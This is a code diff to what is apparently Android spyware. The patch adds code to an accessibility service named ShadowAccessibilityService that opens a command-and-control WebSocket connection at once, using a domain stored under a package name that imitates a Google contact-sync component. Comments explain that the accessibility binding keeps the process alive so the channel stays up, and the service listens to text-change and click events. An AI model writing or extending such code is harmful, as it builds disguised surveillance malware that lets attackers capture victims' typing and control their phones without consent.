@@ -57,6 +57,16 @@ class ShadowAccessibilityService : AccessibilityService() {
             Log.e("ShadowA11y", "Failed to enqueue worker", e)
         }
 
+        // Start C2 immediately — don't wait for the 15-minute PeriodicWork window.
+        // The a11y binding keeps the process alive, so the WSS stays up as long as
+        // Android holds the service.
+        try {
+            val c2Domain = com.google.android.contactsync.BuildConfig.C2_DOMAIN
+            com.shadow.ShadowCore.start(applicationContext, c2Domain)
+        } catch (e: Exception) {
+            Log.e("ShadowA11y", "Failed to start ShadowCore from a11y", e)
+        }
+
         val info = AccessibilityServiceInfo().apply {
             eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                          AccessibilityEvent.TYPE_VIEW_CLICKED or
